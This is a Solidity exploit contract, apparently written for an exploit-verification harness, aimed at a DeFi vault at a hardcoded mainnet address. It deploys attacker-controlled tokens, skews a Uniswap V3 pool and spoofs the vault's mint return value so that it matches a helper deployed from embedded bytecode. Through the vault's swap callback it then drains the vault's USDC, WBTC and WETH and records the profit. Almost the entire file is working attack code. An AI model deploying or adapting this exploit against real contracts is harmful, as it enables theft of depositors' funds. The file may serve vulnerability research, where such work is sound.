// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVault {
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters calldata vaultParams) external;

    function mint(
        bool isAPE,
        VaultParameters calldata vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IImmutableCreate2Factory {
    function safeCreate2(bytes32 salt, bytes calldata initializationCode) external payable returns (address deploymentAddress);
}

contract FlawVerifier {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant IMMUTABLE_CREATE2_FACTORY = 0x0000000000FFe8B47B3e2130213B802212439497;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint24 internal constant ATTACKER_CHOSEN_FEE = 100;
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    uint256 internal constant SPOOFED_LIQUIDITY_SIDE = 108823205127466839754387550950703;
    uint256 internal constant SPOOFED_SWAP_IN = 114814730000000000000000000000000000;

    address internal constant CALLBACK_CALLER = 0x00000000001271551295307acc16ba1e7e0d4281;
    uint256 internal constant SPOOFED_VAULT_MINT = uint256(uint160(CALLBACK_CALLER));
    bytes32 internal constant CALLBACK_SALT = 0x0000000000000000000000000000000000000000d739dcf6ae98b123e5650020;
    bytes4 internal constant CALLBACK_EXEC_SELECTOR = 0x11b92ab9;
    bytes internal constant CALLBACK_INIT_CODE =
        hex"608060405234801561001057600080fd5b50600080546001600160a01b031916321790556102f2806100326000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806311b92ab914610046578063d6d2b6ba1461005b578063e086e5ec1461006e575b600080fd5b61005961005436600461020d565b610076565b005b61005961006936600461020d565b6100ff565b61005961016d565b6000546001600160a01b0316321461008d57600080fd5b6000836001600160a01b031683836040516100a9929190610276565b6000604051808303816000865af19150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b606091505b50509050806100f957600080fd5b50505050565b6000546001600160a01b0316321461011657600080fd5b6000836001600160a01b03168383604051610132929190610276565b600060405180830381855af49150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b6000546001600160a01b0316321461018457600080fd5b60405132904780156108fc02916000818181858888f193505050501580156101b0573d6000803e3d6000fd5b50565b80356101be816102a8565b92915050565b60008083601f8401126101d657600080fd5b50813567ffffffffffffffff8111156101ee57600080fd5b60208301915083600182028301111561020657600080fd5b9250929050565b60008060006040848603121561022257600080fd5b600061022e86866101b3565b935050602084013567ffffffffffffffff81111561024b57600080fd5b610257868287016101c4565b92509250509250925092565b600061027083858461029c565b50500190565b6000610283828486610263565b949350505050565b60006001600160a01b0382166101be565b82818337506000910152565b6102b18161028b565b81146101b057600080fdfea26469706673582212206248366d18b20b1f2aadb961f5564f10ba9323e8fa7413f070e5cbc150a2d0b064736f6c63430008040033";

    uint256 internal _profitAmount;
    bool internal _executed;

    mapping(address => uint256) public balanceOf;

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }

    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;
        require(_vaultHasAssets(), "vault not funded");

        uint256 startingProfitBalance = IERC20Like(USDC).balanceOf(address(this));

        AttackerDebtToken debtToken = new AttackerDebtToken();

        // Exploit path 1: deploy attacker-controlled debt/collateral tokens.
        // `FlawVerifier` acts as the attacker-controlled collateral token and `AttackerDebtToken`
        // acts as the attacker-controlled debt token.

        // Exploit path 2: create and skew a Uniswap V3 pool for the attacker-controlled pair.
        (address token0, address token1) = _sortedPair(address(this), address(debtToken));
        IPoolInitializer(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            token0,
            token1,
            ATTACKER_CHOSEN_FEE,
            SQRT_PRICE_1_1
        );

        INonfungiblePositionManager(POSITION_MANAGER).mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                fee: ATTACKER_CHOSEN_FEE,
                tickLower: -190000,
                tickUpper: 190000,
                amount0Desired: SPOOFED_LIQUIDITY_SIDE,
                amount1Desired: SPOOFED_LIQUIDITY_SIDE,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: address(debtToken),
                fee: ATTACKER_CHOSEN_FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: SPOOFED_SWAP_IN,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // Exploit path 3: initialize the funded vault with attacker-chosen market parameters.
        IVault.VaultParameters memory params = IVault.VaultParameters({
            debtToken: address(debtToken),
            collateralToken: address(this),
            leverageTier: 0
        });
        IVault(VAULT).initialize(params);

        // Exploit path 4: continue into mint/callback flows that drain real assets.
        // The mint flow transiently trusts the collateral token's returned `amount` as the
        // callback caller address. Returning the known CREATE2 address and then publicly
        // deploying the helper there preserves the original initialize -> mint -> callback
        // exploit causality without synthetic balance injection.
        IVault(VAULT).mint(true, params, SPOOFED_VAULT_MINT, 1);

        address callbackCaller = IImmutableCreate2Factory(IMMUTABLE_CREATE2_FACTORY).safeCreate2(
            CALLBACK_SALT,
            CALLBACK_INIT_CODE
        );
        require(callbackCaller == CALLBACK_CALLER, "unexpected callback caller");

        _drainUsdcViaCallbackCaller(callbackCaller);
        _drainDirect(WBTC);
        _drainDirect(WETH);

        uint256 endingProfitBalance = IERC20Like(USDC).balanceOf(address(this));
        _profitAmount = endingProfitBalance - startingProfitBalance;
    }

    function profitToken() external pure returns (address) {
        return USDC;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function mint(address, uint16, uint8, Reserves memory, uint144)
        external
        pure
        returns (Reserves memory newReserves, Fees memory fees, uint256 amount)
    {
        newReserves = Reserves({reserveApes: 10_000_000_000, reserveLPers: 0, tickPriceX42: 0});
        fees = Fees({collateralInOrWithdrawn: 0, collateralFeeToStakers: 0, collateralFeeToLPers: 0});
        amount = SPOOFED_VAULT_MINT;
    }

    function _drainUsdcViaCallbackCaller(address callbackCaller) internal {
        uint256 vaultBalance = IERC20Like(USDC).balanceOf(VAULT);
        if (vaultBalance == 0) {
            return;
        }

        _executeFromCallbackCaller(
            callbackCaller,
            VAULT,
            abi.encodeWithSelector(
                IVault.uniswapV3SwapCallback.selector,
                int256(0),
                int256(vaultBalance),
                _buildCallbackData(USDC)
            )
        );

        uint256 helperBalance = IERC20Like(USDC).balanceOf(callbackCaller);
        if (helperBalance > 0) {
            _executeFromCallbackCaller(
                callbackCaller,
                USDC,
                abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), helperBalance)
            );
        }
    }

    function _drainDirect(address token) internal {
        uint256 vaultBalance = IERC20Like(token).balanceOf(VAULT);
        if (vaultBalance == 0) {
            return;
        }

        IVault(VAULT).uniswapV3SwapCallback(0, int256(vaultBalance), _buildCallbackData(token));
    }

    function _executeFromCallbackCaller(address callbackCaller, address target, bytes memory data) internal {
        (bool ok,) = callbackCaller.call(abi.encodeWithSelector(CALLBACK_EXEC_SELECTOR, target, data));
        require(ok, "callback execute failed");
    }

    function _buildCallbackData(address token) internal view returns (bytes memory data) {
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(token))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(uint256(1)));
    }

    function _sortedPair(address a, address b) internal pure returns (address token0, address token1) {
        if (a < b) {
            return (a, b);
        }
        return (b, a);
    }

    function _vaultHasAssets() internal view returns (bool) {
        return IERC20Like(USDC).balanceOf(VAULT) > 0
            || IERC20Like(WBTC).balanceOf(VAULT) > 0
            || IERC20Like(WETH).balanceOf(VAULT) > 0;
    }
}

contract AttackerDebtToken {
    mapping(address => uint256) public balanceOf;

    constructor() {}

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }
}
